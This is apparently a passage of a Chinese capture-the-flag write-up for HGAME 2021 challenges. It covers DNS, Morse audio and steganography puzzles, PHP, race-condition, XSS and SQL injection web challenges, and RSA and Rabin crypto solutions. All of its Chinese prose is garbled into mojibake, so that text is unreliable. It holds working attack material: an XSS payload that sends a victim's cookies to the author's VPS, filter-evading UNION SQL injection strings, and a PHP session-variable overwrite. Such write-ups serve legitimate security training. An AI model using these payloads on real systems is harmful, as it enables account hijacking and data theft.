çš„ç½‘ç«™ã€‚ BTW, è¿™æ˜¯ä¸ªå…è´¹åŸŸåï¼Œå¥—äº† CloudFlareã€‚ è®¿é—®æç¤º Do you know SPF?ã€‚ å‘ä»¶äººç­–ç•¥æ¡†æ¶ï¼ˆè‹±è¯­ï¼šSender Policy Frameworkï¼›ç®€ç§°SPFï¼› RFC 4408ï¼‰æ˜¯ä¸€å¥—ç”µå­é‚®ä»¶è®¤è¯æœºåˆ¶ï¼Œå¯ä»¥ç¡®è®¤ç”µå­é‚®ä»¶ç¡®å®æ˜¯ç”±ç½‘åŸŸæˆæƒçš„é‚®ä»¶æœåŠ¡å™¨å¯„å‡ºï¼Œé˜²æ­¢æœ‰äººä¼ªå†’èº«ä»½ç½‘ç»œé’“é±¼æˆ–å¯„å‡ºåƒåœ¾ç”µé‚®ã€‚SPFå…è®¸ç®¡ç†å‘˜è®¾å®šä¸€ä¸ªDNS TXTè®°å½•æˆ–SPFè®°å½•è®¾å®šå‘é€é‚®ä»¶æœåŠ¡å™¨çš„IPèŒƒå›´ï¼Œå¦‚æœ‰ä»»ä½•é‚®ä»¶å¹¶éä»ä¸Šè¿°æŒ‡æ˜æˆæƒçš„IPåœ°å€å¯„å‡ºï¼Œåˆ™å¾ˆå¯èƒ½è¯¥é‚®ä»¶å¹¶éç¡®å®ç”±çœŸæ­£çš„å¯„ä»¶è€…å¯„å‡ºï¼ˆé‚®ä»¶ä¸Šå£°ç§°çš„â€œå¯„ä»¶è€…â€ä¸ºå‡å†’ï¼‰ã€‚ Via wikipedia (English version) é…åŸŸåé‚®ç®±çš„æ—¶å€™å°±æ•´è¿‡ï¼Œä¸€èˆ¬æ˜¯éœ€è¦è®¾ä¸ª TXT è®°å½•ã€‚ é‚£å°± dig çœ‹çœ‹å§ã€‚ hgame{D0main_N4me_5ystem} ï¼ˆå˜¿å˜¿ï¼Œè€å¥—è·¯äº† Telegraphï¼š1601 6639 3459 3134 0892 ä»–æ›¾ç»æœ€å–œæ¬¢çš„æ›²å¸ˆå†™çš„æ›²å­ï¼Œè®©äººçŠ¹å¦‚æ¼«æ­¥åœ¨æ˜Ÿç©ºä¹‹ä¸‹ï¼Œå¯å¦‚ä»Šä»–å¬è§åªè§‰å¾—åèƒƒã€‚ç”±äºæ–‡ä»¶åè¿‡é•¿ï¼Œå•ç‹¬ç»™å‡ºé™„ä»¶çš„md5: E5C3EE3F441B860B07A3ADCD98BFFC00è¯·å°†flagä»¥hgame{your_flag_here}å½¢å¼æäº¤ï¼Œflagä¸ºå…¨å¤§å†™ã€‚ [https://1.oss.hgame2021.vidar.club/Telegraph%EF%BC%9A1601%206639%203459%203134%200892.mp3](https://1.oss.hgame2021.vidar.club/Telegraphï¼š1601 6639 3459 3134 0892.mp3) ç”µæŠ¥ 1601 6639 3459 3134 0892 è§£ç å¾—åˆ° å¸¦é€šæ»¤æ³¢å™¨ï¼Œå–µï¼ŒBPF å¥½ä¸œè¥¿ã€‚ æ‹–è¿› Audacityï¼Œé¢‘è°±å›¾çœ‹åˆ°æ˜æ˜¾çš„ 850Hz å­—æ ·ã€‚ åœ¨ 850Hz èŒƒå›´ä¸Šä¸‹è®¾ç½®å¸¦é€šæ»¤æ³¢å™¨åï¼Œåœ¨ 1:10 - 1:35 ä¹‹å‰å¬åˆ°äº†ç”µæŠ¥å£°éŸ³ã€‚ å…¶å®å¯¹æ¯”ä¸€ä¸‹ä¹Ÿèƒ½çœ‹å‡ºæ¥ã€‚ æ‰‹å·¥æŠ„å½•ä¸€ä¸‹ã€‚ -.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- .. è§£å¯†å¾—åˆ° YOURFLAGIS:4G00DS0NGBUTN0T4G00DMAN039310KI hgame{4G00DS0NGBUTN0T4G00DMAN039310KI} Hallucigenia â€œæˆ‘ä»¬ä¸ä»…å¼„é”™äº†ä»–çš„ä¸Šä¸‹ï¼Œè¿˜é¢ å€’äº†å®ƒçš„å·¦å³ã€‚â€ https://1.oss.hgame2021.vidar.club/Hallucigenia_6aa99427e137e9e3563d83f5d639cc74.png å›¾ç‰‡ç¬¬0å±‚é‡Œéšå†™äº†äºŒç»´ç  æ‰«ç å¾—åˆ° gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk= base64 è§£ç å‘ç°æ˜¯å€’ç€çš„ png ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™å¼ å›¾ ä¸Šä¸‹ï¼ˆå‚ç›´ï¼‰å€’ä¸€ä¸‹ï¼Œå¾—åˆ° flagã€‚ hgame{tenchi_souzou_dezain_bu} WebLazyDogR4Uwww.zip ç»™äº†æºç ã€‚ å‘ç°å…¶å®å°±åªæœ‰6ä¸ªæœ‰ç”¨æ–‡ä»¶ã€‚ config.ini æ˜¯ç”¨æˆ·é…ç½®ï¼Œæ³¨æ„åˆ°è¿™é‡Œçš„ testuser å¯†ç  md5 æ˜¯ 0e å¼€å¤´ã€‚ [global] debug = true [admin] username = admin pass_md5 = b02d455009d3cf71951ba28058b2e615 [testuser] username = testuser pass_md5 = 0e114902927253523756713132279690 Config.php è¯»å–ä¸Šé¢çš„é…ç½®æ–‡ä»¶ï¼Œå¯¼å…¥æ‰€æœ‰ç”¨æˆ·ã€‚ &lt;?php class Config{ private static array $conf; /** * @var array|false */ static function init(){ self::$conf = parse_ini_file('config.ini', true); } static function getItem($section, $key){ return self::$conf[$section][$key]; } static function getAllUsers(): array { $users = self::$conf; unset($users['global']); return $users; } } Config::init(); lazy.php è¿™é‡ŒæŠŠæ‰€æœ‰ GET / POST è¿›æ¥çš„æ•°æ®éƒ½ç›´æ¥èµ‹å€¼äº†ï¼Œæ˜¯æ¼æ´ç‚¹ã€‚ &lt;?php $filter = [\"SESSION\", \"SEVER\", \"COOKIE\", \"GLOBALS\"]; // ç›´æ¥æ³¨å†Œæ‰€æœ‰å˜é‡ï¼Œè¿™æ ·æˆ‘å°±èƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~ foreach(array('_GET','_POST') as $_request){ foreach ($$_request as $_k =&gt; $_v){ foreach ($filter as $youBadBad){ $_k = str_replace($youBadBad, '', $_k); } ${$_k} = $_v; } } // è‡ªåŠ¨åŠ è½½ç±»ï¼Œè¿™æ ·æˆ‘ä¹Ÿèƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~ function auto($class_name){ require_once $class_name . \".php\"; } spl_autoload_register('auto'); User.php å®šä¹‰ User ç±» &lt;?php class User { function login($username, $password){ if(session_status() == 1){ session_start(); } $userList = $this-&gt;getUsersList(); if(array_key_exists($username, $userList)){ if(md5($password) == $userList[$username]['pass_md5']){ $_SESSION['username'] = $username; return true; }else{ return false; } } return false; } function logout(){ unset($_SESSION['username']); session_destroy(); } private function getUsersList(){ return Config::getAllUsers(); } } å¯ä»¥çœ‹åˆ°è¿™é‡Œ å¯†ç æ¯”è¾ƒæ˜¯ MD5 å¼±ç±»å‹æ¯”è¾ƒã€‚ index.php &lt;?php session_start(); require_once \"lazy.php\"; if(isset($_SESSION['username'])){ header(\"Location: flag.php\"); exit(); }else{ if(isset($username) &amp;&amp; isset($password)){ if((new User())-&gt;login($username, $password)){ header(\"Location: flag.php\"); exit(); }else{ echo \"&lt;script&gt;alert('é£Ÿäººçš„é­”é¬¼å°è¯•ç€å‘ç­”æ¡ˆè¿›å‘ã€‚')&lt;/script&gt;\"; } } } ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"static/style.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;form class=\"box\" action=\"\" method=\"post\"&gt; &lt;h3 style=\"color: white\"&gt;æœªæˆæƒçš„çš„æ€ªç‰©æ­£åœ¨æœ¬é¡µé¢ç™»é™†&lt;/h3&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" value=\"å°è¯•è¿›å…¥\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; é€»è¾‘æ˜¯ç”¨æˆ·ç™»å½•ï¼Œç„¶åè·³è½¬åˆ° flag.php flag.php &lt;?php session_start(); require_once 'lazy.php'; if(!isset($_SESSION['username'])){ die('æ‚¨é…å—ï¼Ÿ'); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"static/style.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;form class=\"box\" action=\"\" method=\"post\"&gt; &lt;?php if($_SESSION['username'] === 'admin'){ echo \"&lt;h3 style='color: white'&gt;adminå°†äºä»Šæ—¥è·å–è‡ªå·±å¿ å®çš„flag&lt;/h3&gt;\"; echo \"&lt;h3 style='color: white'&gt;$flag&lt;/h3&gt;\"; }else{ if($submit == \"getflag\"){ echo \"&lt;h3 style='color: white'&gt;{$_SESSION['username']}æ¥è¿‘äº†é—®é¢˜çš„ç»ˆç‚¹&lt;/h3&gt;\"; }else{ echo \"&lt;h3 style='color: white'&gt;ç¯¡ä½è€…å é¢†äº†ç¥åœ£çš„é¡µé¢&lt;/h3&gt;\"; } } ?&gt; &lt;input type=\"submit\" name=\"submit\" value=\"getflag\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; å¯ä»¥çœ‹åˆ°é¦–å…ˆè¦æœ‰ $_SESSION['username']ï¼Œå…¶æ¬¡è¿™é‡Œæœ‰ä¸ªè¡¨å•ï¼Œä½†ä¸å…³é”®ã€‚ å…¶å®åªéœ€è¦åœ¨è¿™é‡Œä¼ å‚æ”¹æ‰ $_SESSION['username'] ä¸º admin å°±å¯äº†ã€‚ äºæ˜¯æ„é€  payloadï¼š POST http://5588b617f8.lazy.r4u.top/ username=testuser&amp;password=QNKCDZO æˆåŠŸè·å¾— $_SESSION['username']ï¼Œè€Œåç›´æ¥ GET ä¼ å‚æ”¹æ‰è¿™ä¸ªå°±å¥½äº†ã€‚ æ³¨æ„å®ƒæœ‰ä¸ª filterï¼ŒåŒå†™ç»•è¿‡å°±å¥½äº†ï¼Œå³ _SESSSESSIONION[username]=admin. ï¼ˆå®é™…ä¸Šè¿™é‡Œå¹¶ä¸éœ€è¦ç™»å½• 2333 GET http://5588b617f8.lazy.r4u.top/flag.php?_SESSSESSIONION%5Busername%5D=admin hgame{R4U~!s-4-lazy~doG} Extensive Reading unset_è®°ä¸€é“CTFé¢˜ï¼Œé‡Œé¢è®²äº†ä¸ªæœ‰ç‚¹ç±»ä¼¼çš„ã€‚ foreach(array('_POST', '_GET', '_COOKIE') as $__R) { if($$__R) { foreach($$__R as $__k =&gt; $__v) { if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); } } } Likiçš„ç”Ÿæ—¥ç¤¼ç‰© Likiç”Ÿæ—¥å¿«è¦åˆ°äº†ï¼Œå¥¹æƒ³è¦ä¸€å°switchï¼Œä½ èƒ½å¸®å¸®å¥¹ä¹ˆï¼Ÿ https://birthday.liki.link shop.js é‡Œæœ‰ä¸€äº›æ¥å£ç›¸å…³ä»£ç  function login() { $.post(\"/API/?m=login\", { name: $(\"#name\").val(), password: $(\"#password\").val() }, function (data, status) { var message = JSON.parse(data) if (message.status === \"error\") { alert(message.data) } else if(message.status === \"success\"){ location.href=\"shop.html\" } } ); } function register() { $.post(\"/API/?m=register\", { name: $(\"#name\").val(), password: $(\"#password\").val() }, function (data, status) { var message = JSON.parse(data) if (message.status === \"error\") { alert(message.data); } else if (message.status === \"success\") { alert(message.data); location.href = \"index.html\"; } } ); } function getinfo() { $.get(\"/API/?m=getinfo\", function (data, status) { var message = JSON.parse(data) if (message.status === \"error\") { location.href = \"index.html\" } $(\"#money\").text(message.data['money']) $(\"#num\").text(message.data['num']) } ); } function buy() { $.post(\"/API/?m=buy\", data = $(\"#buy\").serialize() , function (data, status) { var message = JSON.parse(data) if (message.status === \"error\") { alert(message.data) } else { alert(\"å…‘æ¢æˆåŠŸ\"); getinfo(); } }, ); } function logout() { $.get(\"/API/?m=logout\", function (data, status) { var message = JSON.parse(data) if (message.status === \"success\") { alert(message.data); location.href = \"index.html\"; } } ); } function getflag() { $.get(\"/API/?m=getflag\", function (data, status) { var message = JSON.parse(data) alert(message.data) } ); } ç®€å•çœ‹äº†çœ‹å‘ç°æ²¡å•¥é—®é¢˜ï¼Œä¹Ÿåšäº†æ•°æ®çš„åˆæ³•æ€§æ ¡éªŒï¼Œæ¯”å¦‚å¤§æ•°æº¢å‡ºã€floatã€è´Ÿæ•°å•¥çš„åšä¸åˆ°ã€‚ äºæ˜¯è€ƒè™‘æ˜¯ ï¼ˆæ•°æ®åº“ï¼‰æ¡ä»¶ç«äº‰ã€‚ä¹Ÿå°±æ˜¯é€šè¿‡å¤§é‡å¹¶å‘è®©æœåŠ¡å™¨æªæ‰‹ä¸åŠã€‚ åˆ©ç”¨å¤šçº¿ç¨‹å¹¶å‘å»æ‰§è¡ŒåŒä¸€ä¸ª buy æ“ä½œï¼Œä»¥è‡³äºæœåŠ¡å™¨å¤„ç†çš„çº¿ç¨‹ä¹‹é—´æœªèƒ½åŒæ­¥å¥½æ‰€æœ‰è¯·æ±‚ï¼Œæ‰£é™¤ä½™é¢å’Œå‘æ”¾å…‘æ¢åˆ¸ä¸èƒ½åŒæ—¶å®Œæˆï¼Œä»è€Œå°±èƒ½è¶…è¿‡52å¼ å…‘æ¢åˆ¸äº†ã€‚ è¿™é‡Œç”¨ BurpSuite çš„ Intruder æ¥å®ç°ã€‚ å…ˆæŠ“ä¸ªåŒ…ï¼Œæ¯æ¬¡å…‘æ¢ 5ä¸ªå…‘æ¢åˆ¸ã€‚ é€‰æ‹© Null payloadsï¼Œç”Ÿæˆ 100 ä¸ª payloadsï¼Œç„¶åå†å¼€ 10 ä¸ªçº¿ç¨‹å¹¶å‘æ‰§è¡Œã€‚ ç¬é—´å°±è·‘å®Œäº†ï¼Œç„¶ååˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼Œå…‘æ¢ï¼Œæ‹¿åˆ° flagã€‚ hgame{L0ck_1s_TH3_S0lllut!on!!!} æ‰€ä»¥è¦åŠ é”å‘¢ã€‚ BTW, æœ¬æ¥ç”¨ Python å¤šçº¿ç¨‹è·‘çš„ï¼Œå‘ç°ä¸è¡Œâ€¦â€¦ä¼°è®¡å¼€çš„ä¸å¤Ÿå¤šï¼Ÿ Extensive reading: CTFä¸­çš„æ¡ä»¶ç«äº‰æ¼æ´ ä¾‹1ï¼šé‡‘é¢æç° ä¾‹2ï¼šå…ˆå­˜å‚¨æ–‡ä»¶ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œç„¶åå†åˆ é™¤ã€‚===&gt; å†™å…¥ shell æœ¨é©¬ ä¼ªä»£ç ï¼š &lt;?php if(isset($_GET['src'])){ saveimg($_GET['src']); //å¾—åˆ°ä¿å­˜è·¯å¾„filename //æ£€æŸ¥æ–‡ä»¶ check(filename); if(ä¸ç¬¦åˆè§„èŒƒ) delete(filename); else pass; //... } ?&gt; Post to zuckonit d1gg12 æ–°å­¦äº†HTMLï¼Œä¸€èµ·æ¥çœ‹çœ‹ä»–å†™çš„åœ¨çº¿åšå®¢å§ï¼ http://zuckonit.0727.site:7654 XSS script.js é‡Œæœ‰ API $(function () { $.get(\"/code\").done(function (data) { $('#captcha')[0].placeholder = \"Code: md5(code)[:6] == \" + data.code; }); $(\"#send\").click(function () { let contentInput = $(\"#content\").val(); if (contentInput !== \"\") { $.ajax({ type: 'POST', url: '/send', data: {\"content\": contentInput} , success: function (data) { location.reload(); } , error: function (data) { alert(data.responseText); } , }) $('#content').val(\"\"); } }) ; $(\"#clear\").click(function () { $.get(\"/clear\"); $('#output').html(\"\"); }); $(\"#submit\").click(function () { let code = $('#captcha').val(); $.post(\"/submit\", {'code': code}).done(function (data) { alert(data); }); }); }); äºæ˜¯å°±æ„é€  XSS è¯·æ±‚ï¼Œå¯ä»¥å‘ç°ä»–è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œæ¯”å¦‚ script, http, httpsï¼Œè€Œä¸”ç”¨ img çš„æ—¶å€™è¿”å›çš„å­—ç¬¦å€’åºäº†ã€‚ é‚£å’±å°±å€’è¿‡æ¥å†™å§ã€‚ æœ€å¼€å§‹æ˜¯ç”¨ img æ‰“åˆ° https://xss.pt ä¸Šé¢çš„ï¼Œåæ¥æœ‰é—®é¢˜æ€»æ˜¯æ¥æ”¶ä¸åˆ°ã€‚ ç±»ä¼¼äºè¿™æ · &gt;gpj.pW3uo/tp.ssx//'=crs/gmi&lt;img/src='//xss.pt/ou3Wp.jpg å¹²è„†ç›´æ¥æ‰“åˆ°è‡ªå·± VPS ä¸Šï¼Œç”¨ url ç®—äº†ã€‚ æ³¨æ„ submit çš„æ—¶å€™éœ€è¦æ ¡éªŒ md5ï¼Œå†™ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹ã€‚ from hashlib import md5 for i in range(0xFFFFFFF): x = md5(str(i).encode()).hexdigest()[:6] if x == '612bbe': print(i) break Payload: \"eikooc.tnemucod+'/å€’è¿‡æ¥çš„VPSIP//'=ferh.onitacol.wodniw\"=rorreno/'#'=crs/gmi&lt; &lt;img/src='#'/onerror=\"window.location.href='//VPSIP/'+document.cookie\" VPS ä¸Šæ‹¿åˆ° cookie ç„¶åå¸¦ç€è¿™ä¸ª cookie è®¿é—® /flagï¼Œæ‹¿åˆ° flag hgame{X5s_t0_GEt_@dm1n's_cOokies.} 200OK!! hint: status å­—æ®µä¼šæœ‰ä»€ä¹ˆåå¿ƒæ€å‘¢?hint: è¿™äº›å­—ç¬¦ä¸²å­˜åœ¨å“ªé‡Œå‘¢ï¼Ÿå˜é‡ï¼Ÿè¿˜æ˜¯â€¦ï¼Ÿä»Šå¤©ä½  PTSD äº†å—ï¼Ÿ https://200ok.liki.link Header Status å­—æ®µ SQL æ³¨å…¥ã€‚ è¿‡æ»¤äº†ä¸€äº›å…³é”®è¯ï¼Œå¤§å°å†™æ··ç”¨æ¥ç»•è¿‡ï¼Œç©ºæ ¼ç”¨ /**/ ç»•è¿‡ã€‚ # GET https://200ok.liki.link/server.php # æŸ¥è¯¢å½“å‰æ•°æ®åº“ -1'/**/uNion/**/SelecT/**/database()# week2sqli # æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ -1'/**/uNion/**/SelecT/**/group_concAt(schema_name)/**/fRom/**/information_schema.schemata# information_schema,mysql,performance_schema,sys,week2sqli # æŸ¥è¯¢è¡¨å -1'/**/uNion/**/SelecT/**/group_concAt(table_name)/**/frOm/**/information_schema.tables/**/wherE/**/table_schema=database()# f1111111144444444444g,status # æŸ¥è¯¢åˆ—å -1'/**/uNion/**/SelecT/**/group_concAt(column_name)/**/frOm/**/information_schema.columns/**/wherE/**/table_name='f1111111144444444444g'# ffffff14gggggg # æŸ¥è¯¢å­—æ®µå€¼ -1'/**/uNion/**/SelecT/**/ffffff14gggggg/**/frOm/**/f1111111144444444444g# hgame{Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)} Cryptosignintask: from libnum import * from Crypto.Util import number from secret import FLAG m = s2n(FLAG) a = number.getPrime(1024) p = number.getPrime(1024) c = a ** p * m % p print(\"a = {}\".format(a)) print(\"p = {}\".format(p)) print(\"c = {}\".format(c)) # a = 164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543 # p = 119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383 # c = 61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732 (a + b) % n â‰¡ (a % n + b % n) % n(a - b) % n â‰¡ (a % n - b % n) % n(a * b) % n â‰¡ (a % n * b % n) % n(a ^ b) % n â‰¡ ((a % n) ^ b) % n //å¹‚è¿ç®— è‹¥ a â‰¡ b (mod n)ï¼Œåˆ™ å¯¹äºä»»æ„æ­£æ•´æ•°cï¼Œæœ‰ a^c â‰¡ b^c (mod n) å¯¹äºä»»æ„æ•´æ•°cï¼Œæœ‰ ac â‰¡ bc (mod n), a+c â‰¡ b+c (mod n), è‹¥ c â‰¡ d(mod n)ï¼Œåˆ™ a-c â‰¡ b-d(mod n), a+c â‰¡ b+d(mod n), ac â‰¡ bd(mod n) å¦‚æœ acâ‰¡bc (mod m)ï¼Œä¸”cå’Œmäº’è´¨ï¼Œåˆ™ aâ‰¡b (mod mï¼‰ã€‚[ç†è§£ï¼šå½“ä¸”ä»…å½“cå’Œmäº’è´¨ï¼Œc^-1å­˜åœ¨ï¼Œç­‰å¼å·¦å³å¯åŒä¹˜æ¨¡é€†ã€‚] é™¤æ³•è§„åˆ™ï¼šåœ¨æ¨¡næ„ä¹‰ä¸‹ï¼Œa/bä¸å†ä»…ä»…ä»£è¡¨è¿™ä¸¤ä¸ªæ•°ç›¸é™¤ï¼Œè€Œæ˜¯æŒ‡ a + k1 * n å’Œ b + k2 * n è¿™ä¸¤ä¸ªç»„æ•°ä¸­ä»»æ„ä¸¤ä¸ªç›¸é™¤ï¼Œä½¿å•†ä¸ºæ•´æ•°å› æ­¤ä¹Ÿå°±å¯ä»¥ç†è§£ï¼Œé™¤ä»¥ä¸€ä¸ªæ•°ç­‰ä»·äºä¹˜ä»¥å®ƒçš„é€†a/b â‰¡ c(mod n) &lt;=&gt; a â‰¡ c * (b^-1) (mod n)ï¼Œå…¶ä¸­bæ¨¡nçš„é€†è®°ä½œbçš„è´Ÿä¸€æ¬¡æ–¹ã€‚ è´¹é©¬å°å®šç†ï¼šaæ˜¯æ•´æ•°ï¼Œpæ˜¯è´¨æ•°ï¼Œåˆ™ a^p==a (mod p)ï¼Œå¦‚æœ a ä¸æ˜¯ p çš„å€æ•°ï¼Œè¿˜æœ‰ a^(p-1) â‰¡ 1 (mod p) See Also: æ¨¡è¿ç®—æ€»ç»“ å’Œ å–æ¨¡è¿ç®—æ¶‰åŠçš„ç®—æ³• åœ¨è¿™é¢˜é‡Œé¢ï¼Œå°±å¯ä»¥åŒ–ç®€ä¸€ä¸‹ã€‚ $$c = a ^ p \\cdot m \\bmod p \\\\\\ = a \\cdot m \\bmod p \\\\\\Rightarrowm = c \\cdot a^{-1} \\bmod p$$ Exp: from libnum import * import gmpy2 a = gmpy2.mpz(164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543) p = gmpy2.mpz(119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383) c = gmpy2.mpz(61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732) x = gmpy2.invert(a, p) m = c * x % p print(m) print(n2s(int(m))) # 3741406882261031073760817995303276732942491822855369918885665586853805791130867897899676088764261025784189 # b'hgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}' WhitegiveRSA N = 882564595536224140639625987659416029426239230804614613279163 e = 65537 c = 747831491353896780365654517748216624798517769637260742155527 p, q = 857504083339712752489993810777, 1029224947942998075080348647219 hgame{w0w~yOU_kNoW+R5@!} Extensive reading: CTFä¸­å¸¸è§çš„RSAç›¸å…³é—®é¢˜æ€»ç»“ gcd or more?from libnum import * from secret import FLAG p = 85228565021128901853314934583129083441989045225022541298550570449389839609019 q = 111614714641364911312915294479850549131835378046002423977989457843071188836271 n = p * q cipher = pow(s2n(FLAG), 2, n) print(cipher) # 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539 å‚è€ƒ RabinåŠ å¯†ç®—æ³•å’Œnæ¬¡åŒä½™æ–¹ç¨‹ã€Rabin cryptosystem æ­£å¥½ç¬¦åˆåŠ å¯†çš„é€»è¾‘ é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°på’Œqåšä¸ºç§é’¥ è®¡ç®—n = p * qåšä¸ºå…¬é’¥ è‹¥æ˜æ–‡ä¸ºmï¼Œåˆ™å¯†æ–‡ä¸ºc â‰¡ m^2 (mod n) è§£å¯†ï¼š Compute the square root of $c$ modulo $p$ and $q$ using these formulas: $${\\displaystyle {\\begin{aligned}m_{p}=c^{\\frac {1}{4}(p+1)}{\\bmod {p}} \\\\m_{q}=c^{\\frac {1}{4}(q+1)}{\\bmod {q}}\\end{aligned}}}$$ Use the extended Euclidean algorithm to find $y_{p}$ and $y_{q}$ such that $$ y_{p}\\cdot p+y_{q}\\cdot q=1 $$ Use the Chinese remainder theorem to find the four square roots of $c$ modulo $n$: $$r_{1}=\\left(y_{p}\\cdot p\\cdot m_{q}+y_{q}\\cdot q\\cdot m_{p}\\right){\\bmod {n}} \\\\r_{2}=n-r_{1} \\\\r_{3}=\\left(y_{p}\\cdot p\\cdot m_{q}-y_{q}\\cdot q\\cdot m_{p}\\right){\\bmod {n}} \\\\r_{4}=n-r_{3}$$ One of these four values is the original plaintext $m$. å››ä¸ªè§£ä¸­æœ‰ä¸€ä¸ªå°±æ˜¯å¯†æ–‡ mã€‚ æ³¨æ„åˆ°è¿™é‡Œçš„ p, q % 4 == 3. Exp: from gmpy2 import * from random import randint from Crypto.Util.number import getPrime from libnum import * def power(s1, s2, k1, k2, w, p): return ((s1*k1+s2*k2*w) % p, (s1*k2+s2*k1) % p) def Cipolla_algorithm(p, n): a = randint(1, p) w = a ** 2 - n while pow(w, (p-1)//2, p) != p-1: a = randint(1, p) w = a ** 2 - n times = (p+1)//2 k1 = 1 k2 = 0 first = True sum1 = 1 sum2 = 0 while times != 0: if first: k1, k2 = power(k1, k2, a, 1, w, p) first = False else: k1, k2 = power(k1, k2, k1, k2, w, p) if times &amp; 1: sum1, sum2 = power(sum1, sum2, k1, k2, w, p) times &gt;&gt;= 1 return sum1 def CRT(c, n): for i in range(len(n)): for j in range(i + 1, len(n)): assert gcd(n[i], n[j]) == 1 assert len(c) == len(n) N = reduce(lambda a, b: a*b, n) x = 0 for i, j in zip(c, n): N_i = N // j N_i_1 = invert(N_i, j) x += i*N_i*N_i_1 return x % N if __name__ == '__main__': p = 85228565021128901853314934583129083441989045225022541298550570449389839609019 q = 111614714641364911312915294479850549131835378046002423977989457843071188836271 n = p * q c = 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539 get_x1 = Cipolla_algorithm(p, c) get_x2 = Cipolla_algorithm(q, c) assert pow(get_x1, 2, p) == c % p assert pow(get_x2, 2, q) == c % q c11 = get_x1 c12 = p-get_x1 c21 = get_x2 c22 = q-get_x2 print('possible m: ' + str(n2s(int(CRT([c11, c21], [p, q]))))) print('possible m: ' + str(n2s(int(CRT([c11, c22], [p, q]))))) print('possible m: ' + str(n2s(int(CRT([c12, c21], [p, q]))))) print('possible m: ' + str(n2s(int(CRT([c12, c22], [p, q]))))) # possible m: b'hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}' # possible m: b'z\\x95\\x82\\x00R3\\x1d\\x11\\xb3\\x02Q\\xb8\\x1f\\xcd\\xe0\\xd0\\xbeC\\xc31%\\xa8]* \\t\\xdb\\xf1v\\x87O\\xf9 \\x15\\xbc\\xcc+\\xe0\\xebf\\xc4\\xd4k\\nJ\\xfbN\\x03\\\\\\xcc\\x7f\\x00\\xa9\\x90\\xd8l\\xef\\x98\\xce^\\xd3\\xbd72' # possible m: b';\\x0b\\xe7ra 